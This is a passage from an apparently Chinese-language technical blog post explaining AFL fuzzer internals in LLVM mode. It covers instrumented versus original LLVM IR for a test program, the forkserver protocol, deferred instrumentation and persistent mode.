class="line"></span><br><span class="line">; Function Attrs: noinline nounwind ssp uwtable</span><br><span class="line">define i32 @main(i32 %0, i8** %1) #0 &#123;</span><br><span class="line">  %3 &#x3D; alloca [8 x i8], align 1</span><br><span class="line">  %4 &#x3D; getelementptr inbounds [8 x i8], [8 x i8]* %3, i64 0, i64 0</span><br><span class="line">  %5 &#x3D; call i64 @&quot;\01_read&quot;(i32 0, i8* %4, i64 8)</span><br><span class="line">  %6 &#x3D; icmp slt i64 %5, 1</span><br><span class="line">  br i1 %6, label %7, label %9</span><br><span class="line"></span><br><span class="line">7:                                                ; preds &#x3D; %2</span><br><span class="line">  %8 &#x3D; call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str, i64 0, i64 0))</span><br><span class="line">  call void @exit(i32 1) #3</span><br><span class="line">  unreachable</span><br><span class="line"></span><br><span class="line">9:                                                ; preds &#x3D; %2</span><br><span class="line">  %10 &#x3D; getelementptr inbounds [8 x i8], [8 x i8]* %3, i64 0, i64 0</span><br><span class="line">  %11 &#x3D; load i8, i8* %10, align 1</span><br><span class="line">  %12 &#x3D; sext i8 %11 to i32</span><br><span class="line">  %13 &#x3D; icmp eq i32 %12, 48</span><br><span class="line">  br i1 %13, label %14, label %16</span><br><span class="line"></span><br><span class="line">14:                                               ; preds &#x3D; %9</span><br><span class="line">  %15 &#x3D; call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.1, i64 0, i64 0))</span><br><span class="line">  br label %18</span><br><span class="line"></span><br><span class="line">16:                                               ; preds &#x3D; %9</span><br><span class="line">  %17 &#x3D; call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.2, i64 0, i64 0))</span><br><span class="line">  br label %18</span><br><span class="line"></span><br><span class="line">18:                                               ; preds &#x3D; %16, %14</span><br><span class="line">  call void @exit(i32 0) #3</span><br><span class="line">  unreachable</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">declare i64 @&quot;\01_read&quot;(i32, i8*, i64) #1</span><br><span class="line"></span><br><span class="line">declare i32 @printf(i8*, ...) #1</span><br><span class="line"></span><br><span class="line">; Function Attrs: noreturn</span><br><span class="line">declare void @exit(i32) #2</span><br><span class="line"></span><br><span class="line">attributes #0 &#x3D; &#123; noinline nounwind ssp uwtable &quot;correctly-rounded-divide-sqrt-fp-math&quot;&#x3D;&quot;false&quot; &quot;disable-tail-calls&quot;&#x3D;&quot;false&quot; &quot;frame-pointer&quot;&#x3D;&quot;all&quot; &quot;less-precise-fpmad&quot;&#x3D;&quot;false&quot; &quot;min-legal-vector-width&quot;&#x3D;&quot;0&quot; &quot;no-infs-fp-math&quot;&#x3D;&quot;false&quot; &quot;no-jump-tables&quot;&#x3D;&quot;false&quot; &quot;no-nans-fp-math&quot;&#x3D;&quot;false&quot; &quot;no-signed-zeros-fp-math&quot;&#x3D;&quot;false&quot; &quot;no-trapping-math&quot;&#x3D;&quot;false&quot; &quot;stack-protector-buffer-size&quot;&#x3D;&quot;8&quot; &quot;target-cpu&quot;&#x3D;&quot;penryn&quot; &quot;target-features&quot;&#x3D;&quot;+cx16,+cx8,+fxsr,+mmx,+sahf,+sse,+sse2,+sse3,+sse4.1,+ssse3,+x87&quot; &quot;unsafe-fp-math&quot;&#x3D;&quot;false&quot; &quot;use-soft-float&quot;&#x3D;&quot;false&quot; &#125;</span><br><span class="line">attributes #1 &#x3D; &#123; &quot;correctly-rounded-divide-sqrt-fp-math&quot;&#x3D;&quot;false&quot; &quot;disable-tail-calls&quot;&#x3D;&quot;false&quot; &quot;frame-pointer&quot;&#x3D;&quot;all&quot; &quot;less-precise-fpmad&quot;&#x3D;&quot;false&quot; &quot;no-infs-fp-math&quot;&#x3D;&quot;false&quot; &quot;no-nans-fp-math&quot;&#x3D;&quot;false&quot; &quot;no-signed-zeros-fp-math&quot;&#x3D;&quot;false&quot; &quot;no-trapping-math&quot;&#x3D;&quot;false&quot; &quot;stack-protector-buffer-size&quot;&#x3D;&quot;8&quot; &quot;target-cpu&quot;&#x3D;&quot;penryn&quot; &quot;target-features&quot;&#x3D;&quot;+cx16,+cx8,+fxsr,+mmx,+sahf,+sse,+sse2,+sse3,+sse4.1,+ssse3,+x87&quot; &quot;unsafe-fp-math&quot;&#x3D;&quot;false&quot; &quot;use-soft-float&quot;&#x3D;&quot;false&quot; &#125;</span><br><span class="line">attributes #2 &#x3D; &#123; noreturn &quot;correctly-rounded-divide-sqrt-fp-math&quot;&#x3D;&quot;false&quot; &quot;disable-tail-calls&quot;&#x3D;&quot;false&quot; &quot;frame-pointer&quot;&#x3D;&quot;all&quot; &quot;less-precise-fpmad&quot;&#x3D;&quot;false&quot; &quot;no-infs-fp-math&quot;&#x3D;&quot;false&quot; &quot;no-nans-fp-math&quot;&#x3D;&quot;false&quot; &quot;no-signed-zeros-fp-math&quot;&#x3D;&quot;false&quot; &quot;no-trapping-math&quot;&#x3D;&quot;false&quot; &quot;stack-protector-buffer-size&quot;&#x3D;&quot;8&quot; &quot;target-cpu&quot;&#x3D;&quot;penryn&quot; &quot;target-features&quot;&#x3D;&quot;+cx16,+cx8,+fxsr,+mmx,+sahf,+sse,+sse2,+sse3,+sse4.1,+ssse3,+x87&quot; &quot;unsafe-fp-math&quot;&#x3D;&quot;false&quot; &quot;use-soft-float&quot;&#x3D;&quot;false&quot; &#125;</span><br><span class="line">attributes #3 &#x3D; &#123; noreturn &#125;</span><br><span class="line"></span><br><span class="line">!llvm.module.flags &#x3D; !&#123;!0, !1&#125;</span><br><span class="line">!llvm.ident &#x3D; !&#123;!2&#125;</span><br><span class="line"></span><br><span class="line">!0 &#x3D; !&#123;i32 1, !&quot;wchar_size&quot;, i32 4&#125;</span><br><span class="line">!1 &#x3D; !&#123;i32 7, !&quot;PIC Level&quot;, i32 2&#125;</span><br><span class="line">!2 &#x3D; !&#123;!&quot;clang version 10.0.0 &quot;&#125;</span><br></pre></td></tr></table></figure></li><li>插桩后的ir<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line">; ModuleID &#x3D; &#39;m2r_nopt_test-instr.ll&#39;</span><br><span class="line">source_filename &#x3D; &quot;test-instr.c&quot;</span><br><span class="line">target datalayout &#x3D; &quot;e-m:o-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128&quot;</span><br><span class="line">target triple &#x3D; &quot;x86_64-apple-macosx10.15.0&quot;</span><br><span class="line"></span><br><span class="line">@.str &#x3D; private unnamed_addr constant [6 x i8] c&quot;Hum?\0A\00&quot;, align 1</span><br><span class="line">@.str.1 &#x3D; private unnamed_addr constant [26 x i8] c&quot;Looks like a zero to me!\0A\00&quot;, align 1</span><br><span class="line">@.str.2 &#x3D; private unnamed_addr constant [31 x i8] c&quot;A non-zero value? How quaint!\0A\00&quot;, align 1</span><br><span class="line">@__afl_area_ptr &#x3D; external global i8*</span><br><span class="line">@__afl_prev_loc &#x3D; external thread_local global i32</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind ssp uwtable</span><br><span class="line">define i32 @main(i32 %0, i8** %1) #0 &#123;</span><br><span class="line">  %3 &#x3D; load i32, i32* @__afl_prev_loc, !nosanitize !3</span><br><span class="line">  %4 &#x3D; load i8*, i8** @__afl_area_ptr, !nosanitize !3</span><br><span class="line">  %5 &#x3D; xor i32 %3, 17767</span><br><span class="line">  %6 &#x3D; getelementptr i8, i8* %4, i32 %5</span><br><span class="line">  %7 &#x3D; load i8, i8* %6, !nosanitize !3</span><br><span class="line">  %8 &#x3D; add i8 %7, 1</span><br><span class="line">  store i8 %8, i8* %6, !nosanitize !3</span><br><span class="line">  store i32 8883, i32* @__afl_prev_loc, !nosanitize !3</span><br><span class="line">  %9 &#x3D; alloca [8 x i8], align 1</span><br><span class="line">  %10 &#x3D; getelementptr inbounds [8 x i8], [8 x i8]* %9, i64 0, i64 0</span><br><span class="line">  %11 &#x3D; call i64 @&quot;\01_read&quot;(i32 0, i8* %10, i64 8)</span><br><span class="line">  %12 &#x3D; icmp slt i64 %11, 1</span><br><span class="line">  br i1 %12, label %13, label %21</span><br><span class="line"></span><br><span class="line">13:                                               ; preds &#x3D; %2</span><br><span class="line">  %14 &#x3D; load i32, i32* @__afl_prev_loc, !nosanitize !3</span><br><span class="line">  %15 &#x3D; load i8*, i8** @__afl_area_ptr, !nosanitize !3</span><br><span class="line">  %16 &#x3D; xor i32 %14, 9158</span><br><span class="line">  %17 &#x3D; getelementptr i8, i8* %15, i32 %16</span><br><span class="line">  %18 &#x3D; load i8, i8* %17, !nosanitize !3</span><br><span class="line">  %19 &#x3D; add i8 %18, 1</span><br><span class="line">  store i8 %19, i8* %17, !nosanitize !3</span><br><span class="line">  store i32 4579, i32* @__afl_prev_loc, !nosanitize !3</span><br><span class="line">  %20 &#x3D; call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str, i64 0, i64 0))</span><br><span class="line">  call void @exit(i32 1) #3</span><br><span class="line">  unreachable</span><br><span class="line"></span><br><span class="line">21:                                               ; preds &#x3D; %2</span><br><span class="line">  %22 &#x3D; load i32, i32* @__afl_prev_loc, !nosanitize !3</span><br><span class="line">  %23 &#x3D; load i8*, i8** @__afl_area_ptr, !nosanitize !3</span><br><span class="line">  %24 &#x3D; xor i32 %22, 39017</span><br><span class="line">  %25 &#x3D; getelementptr i8, i8* %23, i32 %24</span><br><span class="line">  %26 &#x3D; load i8, i8* %25, !nosanitize !3</span><br><span class="line">  %27 &#x3D; add i8 %26, 1</span><br><span class="line">  store i8 %27, i8* %25, !nosanitize !3</span><br><span class="line">  store i32 19508, i32* @__afl_prev_loc, !nosanitize !3</span><br><span class="line">  %28 &#x3D; getelementptr inbounds [8 x i8], [8 x i8]* %9, i64 0, i64 0</span><br><span class="line">  %29 &#x3D; load i8, i8* %28, align 1</span><br><span class="line">  %30 &#x3D; sext i8 %29 to i32</span><br><span class="line">  %31 &#x3D; icmp eq i32 %30, 48</span><br><span class="line">  br i1 %31, label %32, label %40</span><br><span class="line"></span><br><span class="line">32:                                               ; preds &#x3D; %21</span><br><span class="line">  %33 &#x3D; load i32, i32* @__afl_prev_loc, !nosanitize !3</span><br><span class="line">  %34 &#x3D; load i8*, i8** @__afl_area_ptr, !nosanitize !3</span><br><span class="line">  %35 &#x3D; xor i32 %33, 18547</span><br><span class="line">  %36 &#x3D; getelementptr i8, i8* %34, i32 %35</span><br><span class="line">  %37 &#x3D; load i8, i8* %36, !nosanitize !3</span><br><span class="line">  %38 &#x3D; add i8 %37, 1</span><br><span class="line">  store i8 %38, i8* %36, !nosanitize !3</span><br><span class="line">  store i32 9273, i32* @__afl_prev_loc, !nosanitize !3</span><br><span class="line">  %39 &#x3D; call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.1, i64 0, i64 0))</span><br><span class="line">  br label %48</span><br><span class="line"></span><br><span class="line">40:                                               ; preds &#x3D; %21</span><br><span class="line">  %41 &#x3D; load i32, i32* @__afl_prev_loc, !nosanitize !3</span><br><span class="line">  %42 &#x3D; load i8*, i8** @__afl_area_ptr, !nosanitize !3</span><br><span class="line">  %43 &#x3D; xor i32 %41, 56401</span><br><span class="line">  %44 &#x3D; getelementptr i8, i8* %42, i32 %43</span><br><span class="line">  %45 &#x3D; load i8, i8* %44, !nosanitize !3</span><br><span class="line">  %46 &#x3D; add i8 %45, 1</span><br><span class="line">  store i8 %46, i8* %44, !nosanitize !3</span><br><span class="line">  store i32 28200, i32* @__afl_prev_loc, !nosanitize !3</span><br><span class="line">  %47 &#x3D; call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.2, i64 0, i64 0))</span><br><span class="line">  br label %48</span><br><span class="line"></span><br><span class="line">48:                                               ; preds &#x3D; %40, %32</span><br><span class="line">  %49 &#x3D; load i32, i32* @__afl_prev_loc, !nosanitize !3</span><br><span class="line">  %50 &#x3D; load i8*, i8** @__afl_area_ptr, !nosanitize !3</span><br><span class="line">  %51 &#x3D; xor i32 %49, 23807</span><br><span class="line">  %52 &#x3D; getelementptr i8, i8* %50, i32 %51</span><br><span class="line">  %53 &#x3D; load i8, i8* %52, !nosanitize !3</span><br><span class="line">  %54 &#x3D; add i8 %53, 1</span><br><span class="line">  store i8 %54, i8* %52, !nosanitize !3</span><br><span class="line">  store i32 11903, i32* @__afl_prev_loc, !nosanitize !3</span><br><span class="line">  call void @exit(i32 0) #3</span><br><span class="line">  unreachable</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">declare i64 @&quot;\01_read&quot;(i32, i8*, i64) #1</span><br><span class="line"></span><br><span class="line">declare i32 @printf(i8*, ...) #1</span><br><span class="line"></span><br><span class="line">; Function Attrs: noreturn</span><br><span class="line">declare void @exit(i32) #2</span><br><span class="line"></span><br><span class="line">attributes #0 &#x3D; &#123; noinline nounwind ssp uwtable &quot;correctly-rounded-divide-sqrt-fp-math&quot;&#x3D;&quot;false&quot; &quot;disable-tail-calls&quot;&#x3D;&quot;false&quot; &quot;frame-pointer&quot;&#x3D;&quot;all&quot; &quot;less-precise-fpmad&quot;&#x3D;&quot;false&quot; &quot;min-legal-vector-width&quot;&#x3D;&quot;0&quot; &quot;no-infs-fp-math&quot;&#x3D;&quot;false&quot; &quot;no-jump-tables&quot;&#x3D;&quot;false&quot; &quot;no-nans-fp-math&quot;&#x3D;&quot;false&quot; &quot;no-signed-zeros-fp-math&quot;&#x3D;&quot;false&quot; &quot;no-trapping-math&quot;&#x3D;&quot;false&quot; &quot;stack-protector-buffer-size&quot;&#x3D;&quot;8&quot; &quot;target-cpu&quot;&#x3D;&quot;penryn&quot; &quot;target-features&quot;&#x3D;&quot;+cx16,+cx8,+fxsr,+mmx,+sahf,+sse,+sse2,+sse3,+sse4.1,+ssse3,+x87&quot; &quot;unsafe-fp-math&quot;&#x3D;&quot;false&quot; &quot;use-soft-float&quot;&#x3D;&quot;false&quot; &#125;</span><br><span class="line">attributes #1 &#x3D; &#123; &quot;correctly-rounded-divide-sqrt-fp-math&quot;&#x3D;&quot;false&quot; &quot;disable-tail-calls&quot;&#x3D;&quot;false&quot; &quot;frame-pointer&quot;&#x3D;&quot;all&quot; &quot;less-precise-fpmad&quot;&#x3D;&quot;false&quot; &quot;no-infs-fp-math&quot;&#x3D;&quot;false&quot; &quot;no-nans-fp-math&quot;&#x3D;&quot;false&quot; &quot;no-signed-zeros-fp-math&quot;&#x3D;&quot;false&quot; &quot;no-trapping-math&quot;&#x3D;&quot;false&quot; &quot;stack-protector-buffer-size&quot;&#x3D;&quot;8&quot; &quot;target-cpu&quot;&#x3D;&quot;penryn&quot; &quot;target-features&quot;&#x3D;&quot;+cx16,+cx8,+fxsr,+mmx,+sahf,+sse,+sse2,+sse3,+sse4.1,+ssse3,+x87&quot; &quot;unsafe-fp-math&quot;&#x3D;&quot;false&quot; &quot;use-soft-float&quot;&#x3D;&quot;false&quot; &#125;</span><br><span class="line">attributes #2 &#x3D; &#123; noreturn &quot;correctly-rounded-divide-sqrt-fp-math&quot;&#x3D;&quot;false&quot; &quot;disable-tail-calls&quot;&#x3D;&quot;false&quot; &quot;frame-pointer&quot;&#x3D;&quot;all&quot; &quot;less-precise-fpmad&quot;&#x3D;&quot;false&quot; &quot;no-infs-fp-math&quot;&#x3D;&quot;false&quot; &quot;no-nans-fp-math&quot;&#x3D;&quot;false&quot; &quot;no-signed-zeros-fp-math&quot;&#x3D;&quot;false&quot; &quot;no-trapping-math&quot;&#x3D;&quot;false&quot; &quot;stack-protector-buffer-size&quot;&#x3D;&quot;8&quot; &quot;target-cpu&quot;&#x3D;&quot;penryn&quot; &quot;target-features&quot;&#x3D;&quot;+cx16,+cx8,+fxsr,+mmx,+sahf,+sse,+sse2,+sse3,+sse4.1,+ssse3,+x87&quot; &quot;unsafe-fp-math&quot;&#x3D;&quot;false&quot; &quot;use-soft-float&quot;&#x3D;&quot;false&quot; &#125;</span><br><span class="line">attributes #3 &#x3D; &#123; noreturn &#125;</span><br><span class="line"></span><br><span class="line">!llvm.module.flags &#x3D; !&#123;!0, !1&#125;</span><br><span class="line">!llvm.ident &#x3D; !&#123;!2&#125;</span><br><span class="line"></span><br><span class="line">!0 &#x3D; !&#123;i32 1, !&quot;wchar_size&quot;, i32 4&#125;</span><br><span class="line">!1 &#x3D; !&#123;i32 7, !&quot;PIC Level&quot;, i32 2&#125;</span><br><span class="line">!2 &#x3D; !&#123;!&quot;clang version 10.0.0 &quot;&#125;</span><br><span class="line">!3 &#x3D; !&#123;&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="afl-llvm-rt"><a href="#afl-llvm-rt" class="headerlink" title="afl-llvm-rt"></a>afl-llvm-rt</h3><p>AFL LLVM_Mode中存在着三个特殊的功能。这三个功能的源码位于afl-llvm-rt.o.c中。</p><h4 id="deferred-instrumentation"><a href="#deferred-instrumentation" class="headerlink" title="deferred instrumentation"></a>deferred instrumentation</h4><p>AFL会尝试通过仅执行一次目标二进制文件来优化性能。它会暂停控制流，然后复制该“主”进程以持续提供fuzzer的目标。该功能在某些情况下可以减少操作系统、链接与libc内部执行程序的成本。<br>选好位置后，将下述代码添加到该位置上，之后使用afl-clang-fast重新编译代码即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#ifdef __AFL_HAVE_MANUAL_CONTROL</span><br><span class="line">  __AFL_INIT();</span><br><span class="line">#endif</span><br></pre></td></tr></table></figure><p><code>__AFL_INIT()</code>内部调用<code>__afl_manual_init</code>函数。该函数的源代码如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __afl_manual_init(<span class="keyword">void</span>) &#123;</span><br><span class="line">  <span class="keyword">static</span> u8 init_done;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!init_done) &#123;</span><br><span class="line"></span><br><span class="line">    __afl_map_shm();</span><br><span class="line">    __afl_start_forkserver();</span><br><span class="line">    init_done = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果还没有被初始化，就初始化共享内存，然后开始执行forkserver，然后设置init_done为1。</p><p><code>__afl_map_shm</code>就是简单的通过读取环境变量<code>SHM_ENV_VAR</code>来获取共享内存，然后将地址赋值给<code>__afl_area_ptr</code>。否则，默认的<code>__afl_area_ptr</code>指向的是一个数组。</p><p><code>__afl_start_forkserver</code>的逻辑稍微复杂，分条叙述</p><ul><li>首先设置<code>child_stopped</code>为0，然后通过<code>FORKSRV_FD + 1</code>向状态管道写入4个字节，告知AFL fuzz已经准备好了。</li><li>然后进入fuzz loop循环<ul><li>通过read从控制管道<code>FORKSRV_FD</code>读取4个字节，如果当前管道中没有内容，就会堵塞在这里，如果读到了，就代表AFL命令我们fork server去执行一次fuzz</li><li>如果<code>child_stopped</code>为0，则直接fork出一个子进程去进行fuzz<ul><li>然后此时对于子进程就会关闭和控制管道和状态管道相关的fd，然后return跳出fuzz loop，恢复正常执行。</li></ul></li><li>如果<code>child_stopped</code>为1，这是对于persistent mode的特殊处理，此时子进程还活着，只是被暂停了，所以可以通过<code>kill(child_pid, SIGCONT)</code>来简单的重启，然后设置<code>child_stopped</code>为0。</li><li>然后fork server向状态管道<code>FORKSRV_FD + 1</code>写入子进程的pid，然后等待子进程结束，注意这里对于persistent mode，我们会设置waitpid的第三个参数为WUNTRACED，代表若子进程进入暂停状态，则马上返回。</li><li>WIFSTOPPED(status)宏确定返回值是否对应于一个暂停子进程，因为在persistent mode里子进程会通过SIGSTOP信号来暂停自己，并以此指示运行成功，所以在这种情况下，我们需要再进行一次fuzz，就只需要和上面一样，通过SIGCONT信号来唤醒子进程继续执行即可，不需要再进行一次fuzz。<ul><li>设置<code>child_stopped</code>为1。</li></ul></li><li>当子进程结束以后，向状态管道<code>FORKSRV_FD + 1</code>写入4个字节，通知AFL这次target执行结束了。</li></ul></li></ul><h4 id="persistent-mode"><a href="#persistent-mode" class="headerlink" title="persistent mode"></a>persistent mode</h4><p>上面我们其实已经介绍过persistent mode的一些特点了，那就是它并不是通过fork出子进程去进行fuzz的，而是认为当前我们正在fuzz的API是无状态的，当API重置后，一个长期活跃的进程就可以被重复使用，这样可以消除重复执行fork函数以及OS相关所需要的开销。<br>所以的使用方法如下:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (__AFL_LOOP(<span class="number">1000</span>)) &#123;</span><br><span class="line">  <span class="comment">/* Read input data. */</span></span><br><span class="line">  <span class="comment">/* Call library code to be fuzzed. */</span></span><br><span class="line">  <span class="comment">/* Reset state. */</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* Exit normally */</span></span><br></pre></td></tr></table></figure><p>循环次数不能设置过大，因为较小的循环次数可以将内存泄漏和类似故障的影响降到最低。所以循环次数设置成1000是个不错的选择。</p><p>接下来我们来解读一下源码，首先介绍一个<code>__attribute__ constructor</code>，demo如下，代表被此修饰的函数将在main执行之前自动运行</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">__attribute__((constructor(<span class="number">1</span>))) <span class="function"><span class="keyword">void</span> <span class="title">before_main1</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"before_main1\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line">__attribute__((constructor(<span class="number">2</span>))) <span class="function"><span class="keyword">void</span> <span class="title">before_main2</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"before_main2\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line">__attribute__((destructor(<span class="number">1</span>))) <span class="function"><span class="keyword">void</span> <span class="title">after_main1</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"after_main1\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line">__attribute__((destructor(<span class="number">2</span>))) <span class="function"><span class="keyword">void</span> <span class="title">after_main2</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"after_main2\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"main\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">before_main1</span><br><span class="line">before_main2</span><br><span class="line">main</span><br><span class="line">after_main2</span><br><span class="line">after_main1</span><br></pre></td></tr></table></figure><p>llvm mode里有一个函数<code>__attribute__((constructor(CONST_PRIO))) void __afl_auto_init(void)</code>，其逻辑如下</p><ul><li>读取环境变量PERSIST_ENV_VAR的值，设置给is_persistent</li><li>读取环境变量DEFER_ENV_VAR的值，如果为1，就直接返回，这代表<code>__afl_auto_init</code>和deferred instrumentation不通用，这其实道理也很简单，因为deferred instrumentation会自己选择合适的时机，手动init，不需要用这个函数来init，所以这个函数只在没有手动init的时候会自动init。</li><li>执行<code>__afl_manual_init</code>函数，其含义见上文。</li></ul><p>宏定义<code>__AFL_LOOP</code>内部调用<code>__afl_persistent_loop</code>函数。<br><code>__afl_persistent_loop(unsigned int max_cnt)</code>的逻辑如下</p><ul><li>如果是第一次执行loop<ul><li>如果is_persistent为1<ul><li>清空<code>__afl_area_ptr</code>，设置<code>__afl_area_ptr[0]</code>为1，<code>__afl_prev_loc</code>为0</li></ul></li><li>设置cycle_cnt的值为传入的max_cnt参数，然后直接返回1</li></ul></li><li>如果不是第一次执行loop<ul><li>如果cycle_cnt减一（代表需要执行的循环次数减一）后大于0<ul><li>发出信号<code>SIGSTOP</code>来让当前进程暂停</li><li>设置<code>__afl_area_ptr[0]</code>为1，<code>__afl_prev_loc</code>为0，然后直接返回1</li></ul></li><li>如果cycle_cnt为0<ul><li>设置<code>__afl_area_ptr</code>指向一个无关数组<code>__afl_area_initial</code>。</li></ul></li></ul></li></ul><p>我们将这些联系在一起，重新梳理一遍<br>假设我们是这么使用的:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (__AFL_LOOP(<span class="number">1000</span>)) &#123;</span><br><span class="line">    fuzzAPI();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>首先在main函数之前读取共享内容，然后以当前进程为fork server，去和AFL fuzz通信。</li><li>当AFL fuzz通知进行一次fuzz，由于此时child_stopped为0，则fork server先fork出一个子进程。</li><li>这个子进程会很快执行到<code>__AFL_LOOP</code>包围的代码，因为是第一次执行loop，所以会先清空<code>__afl_area_ptr</code>和设置<code>__afl_prev_loc</code>为0，并向共享内存的第一个元素写一个值，然后设置循环次数1000，随后返回1，此时<code>while(__AFL_LOOP)</code>满足条件，于是执行一次fuzzAPI。</li><li>然后因为是while循环，会再次进入<code>__AFL_LOOP</code>里，此时将循环次数减一，变成999，然后发出信号<code>SIGSTOP</code>来让当前进程暂停，因为我们设置了WUNTRACED，所以waitpid函数就会返回，fork server将继续执行。</li><li>fork server在收到<code>SIGSTOP</code>信号后就知道fuzzAPI已经被成功执行结束了，就设置child_stopped为1，并告知AFL fuzz</li><li>然后当AFL fuzz通知再进行一次fuzz的时候，fork 